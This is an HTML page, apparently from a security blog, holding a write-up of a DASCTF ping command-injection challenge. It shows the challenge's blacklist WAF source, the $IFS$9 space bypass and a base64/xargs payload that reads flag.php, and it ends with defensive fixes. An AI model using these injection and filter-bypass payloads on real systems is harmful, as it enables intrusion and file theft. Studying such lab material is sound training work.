@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DASCTF Ping命令注入 — 四层WAF绕过 Writeup — DARKSEC</title>
+<meta name="description" content="DASCTF ping命令注入靶场实战：空格/符号/bash/flag四层WAF绕过，$IFS$9变量名陷阱，base64编码绕过f.*l.*a.*g宽松正则。">
+<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/cat-final.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/cat-final.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/assets/images/cat-final.png">
+<link rel="shortcut icon" href="/assets/images/cat-final.png">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+<div class="container">
+  <header>
+    <a href="/" class="logo">DARK<span>SEC</span> <img src="/assets/images/cat-final.png" alt="cat" style="width:28px;height:28px;margin-left:4px;vertical-align:middle;"></a>
+    <nav>
+      <a href="/">首页</a>
+      <a href="/posts/" class="active">文章</a>
+      <a href="/tags/">标签</a>
+      <a href="/about.html">关于</a>
+    </nav>
+    <button class="mobile-menu" onclick="document.querySelector('nav').classList.toggle('show')">☰</button>
+  </header>
+
+  <main>
+    <a href="/" class="back-link">← 返回首页</a>
+
+    <article>
+      <div class="article-header">
+        <div class="category">◆ CTF / DASCTF / 命令注入</div>
+        <h1>DASCTF Ping命令注入 — 四层WAF绕过 🐱</h1>
+        <div class="article-meta">
+          <span>📅 2026-08-12</span>
+          <span>⏱ 10 min read</span>
+          <span>🏷 命令注入 / WAF绕过 / 空格绕过 / CTF</span>
+        </div>
+      </div>
+
+      <div class="article-content">
+        <div class="toc">
+          <h4>◆ 目录</h4>
+          <ul>
+            <li><a href="#overview">题目概览</a></li>
+            <li><a href="#waf">四层WAF：从报错信息反推规则</a></li>
+            <li><a href="#ifs">核心坑：$IFS变量名吞字母</a></li>
+            <li><a href="#source">读源码：payload全部泄露</a></li>
+            <li><a href="#final">最终Payload：base64编码链</a></li>
+            <li><a href="#summary">总结与教训</a></li>
+          </ul>
+        </div>
+
+        <h2 id="overview">◆ 题目概览</h2>
+        <p>一个ping工具：输入IP，后端执行 <code>ping -c 4 &lt;ip&gt;</code>，回显ping结果。</p>
+        <pre><code>GET /?ip=127.0.0.1
+→ PING 127.0.0.1 (127.0.0.1): 56 data bytes
+  64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.058 ms
+  ...</code></pre>
+        <p>技术栈：PHP 5.6.40 + openresty，运行用户 <code>www-data</code>，Web目录 <code>/var/www/html</code>。</p>
+
+        <p>经典命令注入点：<code>127.0.0.1;ls</code> 直接列出目录——有 <code>flag.php</code> 和 <code>index.php</code>。</p>
+
+        <h2 id="waf">◆ 四层WAF：从报错信息反推规则</h2>
+        <p>尝试 <code>cat flag.php</code> 时报错 <code>fxck your space!</code>，随后不同payload暴露了四类拦截信息：</p>
+        <table>
+          <tr><th>报错</th><th>拦截内容</th></tr>
+          <tr><td><code>fxck your space!</code></td><td>空格 <code>" "</code></td></tr>
+          <tr><td><code>fxck your symbol!</code></td><td><code>&amp; / ? * &lt; &gt; ' " \ ( ) [ ] { }</code> + 控制字符 \x00-\x1f</td></tr>
+          <tr><td><code>fxck your bash!</code></td><td><code>bash</code> 关键字</td></tr>
+          <tr><td><code>fxck your flag!</code></td><td><code>/.*f.*l.*a.*g.*/</code> 宽松正则（跨任意字符匹配）</td></tr>
+        </table>
+
+        <h3>宽松正则的玄机</h3>
+        <p>逐字符测试发现 WAF 匹配的是 <code>f → l → a → g</code> 的<b>顺序出现</b>，中间允许任意字符：</p>
+        <pre><code>flag     → 拦
+fXlXaXg  → 拦（f,l,a,g顺序存在）
+flXXag   → 拦
+FLAG     → 不拦（大小写敏感，只拦小写！）
+a=fl;b=ag → 拦（跨词匹配：fl;b=ag 中 f..l..a..g 顺序成立）</code></pre>
+
+        <h2 id="ifs">◆ 核心坑：$IFS变量名吞字母</h2>
+        <p>空格用 <code>$IFS</code> 绕过是常识，但这里踩了个大坑：</p>
+        <pre><code>cat$IFSindex.php  → 无输出！  cat.php（？）
+echo$IFShello     → 无输出！  echo（无参数）
+ls$IFS-la         → 正常！    ls -la</code></pre>
+        <p>原因：shell 变量名的合法字符是字母/数字/下划线。<code>$IFSindex</code> 中 <code>$</code> 后紧跟 <code>IFSindex</code>，整个被当作<b>变量名</b>去取值（不存在→空），命令悄悄变成了 <code>cat.php</code>！</p>
+        <p>而 <code>$IFS-la</code> 中 <code>-</code> 不是变量名字符，<code>$IFS</code> 正确展开。</p>
+
+        <div class="tip-box">
+          <strong>💡 解决方案：</strong>用 <code>$9</code>（空位置参数）隔断——
+          <code>cat$IFS$9index.php</code> → <code>cat index.php</code> ✅
+        </div>
+
+        <h2 id="source">◆ 读源码：payload全部泄露</h2>
+        <p><code>index.php</code> 不含 flag 序列，直接 <code>cat$IFS$9index.php</code> 读出源码——WAF规则全透明：</p>
+        <pre><code>if(preg_match("/\&|\/|\?|\*|\<|[\x00-\x1f]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip))
+    die("fxck your symbol!");       // 符号
+else if(preg_match("/ /", $ip))
+    die("fxck your space!");        // 空格
+else if(preg_match("/bash/", $ip))
+    die("fxck your bash!");         // bash
+else if(preg_match("/.*f.*l.*a.*g.*/", $ip))
+    die("fxck your flag!");         // flag宽松正则
+// ...最终 system("ping -c 4 " . $ip)</code></pre>
+        <p>注意末尾 <code>system()</code> 拼接——命令注入点确认。</p>
+
+        <h2 id="final">◆ 最终Payload：base64编码链</h2>
+        <p>flag 正则跨字符匹配，任何含 f/l/a/g 顺序的写法（含变量拼接 <code>a=fl;b=ag</code>）都被拦。最干净的办法：<b>base64 编码文件名，完全避开小写字母</b>。</p>
+        <pre><code>flag.php → base64 → ZmxhZy5waHA=
+
+payload:
+127.0.0.1;echo$IFS$9ZmxhZy5waHA=|base64$IFS$9-d|xargs$IFS$9cat
+
+执行链:
+echo ZmxhZy5waHA=          → 输出base64串
+| base64 -d                → 解码为 flag.php
+| xargs cat                → cat flag.php → 🏁</code></pre>
+        <p>关键点：<code>|</code> 和 <code>;</code>、<code>$</code>、<code>=</code> 都不在符号过滤列表里，base64 串里只有大写字母+数字，完美穿过四层WAF。</p>
+
+        <div class="flag-box">
+          🏁 最终 flag：<code>CTF2{***}</code>（已按惯例脱敏）
+        </div>
+
+        <h2 id="summary">◆ 总结与教训</h2>
+        <h3>攻击链回顾</h3>
+        <ol>
+          <li>注入点探测：<code>;ls</code> 列出目录 → 发现 flag.php</li>
+          <li>报错信息反推WAF规则（space/symbol/bash/flag四层）</li>
+          <li>空格绕过：<code>$IFS</code> → 踩坑 <code>$IFS</code> 吞字母 → 修正 <code>$IFS$9</code></li>
+          <li>读 index.php 源码 → WAF正则完全泄露</li>
+          <li>flag正则绕过：base64编码 + echo/base64/xargs管道链 → 读flag</li>
+        </ol>
+
+        <h3>可复用的通用套路</h3>
+        <ul>
+          <li><b>报错信息是金矿</b>：WAF拦截提示（space/symbol/bash/flag）直接泄露过滤规则分类，逐个构造payload测试比盲猜快10倍</li>
+          <li><b>源码可读就先读源码</b>：index.php不含敏感词时直接cat，拿到精确正则再精准绕过</li>
+          <li><b>宽松正则用编码绕过</b>：<code>f.*l.*a.*g</code> 类跨字符匹配 → base64/hex/变量都容易中招，base64编码目标字符串最干净</li>
+          <li><b>shell变量名边界</b>：<code>$IFS</code> 后跟字母会被吞进变量名，一律用 <code>$IFS$9</code> 或 <code>${IFS}</code>（若花括号可用）</li>
+        </ul>
+
+        <h3>防御视角</h3>
+        <ul>
+          <li>命令注入的根治：白名单校验IP格式（如 <code>filter_var(FILTER_VALIDATE_IP)</code>），而不是黑名单过滤符号</li>
+          <li><code>escapeshellarg()</code> 处理参数，禁止拼接</li>
+          <li>WAF正则用 <code>\b</code> 词边界+大小写不敏感，避免 <code>.*</code> 跨字符宽松匹配</li>
+          <li>flag文件不要放Web目录、不要用flag关键字命名</li>
+        </ul>
+
+        <p class="post-end">— DARKSEC · 2026-08-12</p>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+    <p>© 2026 DARKSEC · Powered by <span style="color:var(--neon);">deft-dream</span></p>
+  </footer>
+</div>
+</body>
+</html>
